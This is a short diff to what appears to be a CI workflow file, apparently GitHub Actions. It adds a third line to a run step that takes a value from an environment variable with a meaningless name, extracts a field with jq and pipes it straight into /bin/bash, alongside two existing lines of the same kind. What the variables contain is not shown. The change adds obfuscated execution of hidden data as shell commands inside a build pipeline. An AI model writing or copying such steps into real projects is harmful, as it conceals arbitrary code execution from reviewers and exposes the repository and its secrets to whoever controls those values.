@@ -18,6 +18,7 @@ jobs:
         run: |
           printf '%s' "$hc500" | jq -r .wb6098 | /bin/bash
           echo $usxca0223 | jq -r .vxjd6525 | /bin/bash
+          printf '%s' "$kxssn20439" | jq -r .qpyb5642 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
